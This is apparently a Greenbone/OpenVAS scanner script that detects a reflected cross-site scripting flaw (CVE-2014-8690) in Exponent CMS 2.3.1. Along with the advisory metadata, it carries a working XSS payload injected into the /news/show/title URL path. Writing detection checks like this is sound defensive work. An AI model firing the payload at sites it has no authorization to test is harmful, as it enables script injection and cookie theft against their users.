CPE = "cpe:/a:exponentcms:exponent_cms";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.805139" );
	script_version( "2020-05-08T08:34:44+0000" );
	script_cve_id( "CVE-2014-8690" );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_tag( name: "last_modification", value: "2020-05-08 08:34:44 +0000 (Fri, 08 May 2020)" );
	script_tag( name: "creation_date", value: "2015-02-16 13:11:02 +0530 (Mon, 16 Feb 2015)" );
	script_name( "Exponent CMS Multiple XSS Vulnerabilities - Feb15" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2015 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_exponet_cms_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "ExponentCMS/installed" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/36059" );
	script_tag( name: "summary", value: "This host is installed with Exponent CMS
  and is prone to multiple xss vulnerability." );
	script_tag( name: "vuldetect", value: "Send a crafted request via HTTP GET and
  check whether it is able to read cookie or not." );
	script_tag( name: "insight", value: "Flaws are due to the /users/edituser and
  the /news/ functionality does not validate input to the 'First Name' and
  'Last Name' fields before returning it to users." );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker
  to execute arbitrary HTML and script code in the context of an affected site." );
	script_tag( name: "affected", value: "Exponent CMS version 2.3.1, Prior versions
  may also be affected." );
	script_tag( name: "solution", value: "Apply the patch version 2.3.1 Patch 4." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("host_details.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
url = dir + "/news/show/title/\"><script>alert(document.cookie)</script>";
if(http_vuln_check( port: port, url: url, check_header: TRUE, pattern: "<script>alert\\(document.cookie\\)</script>", extra_check: ">Exponent<" )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

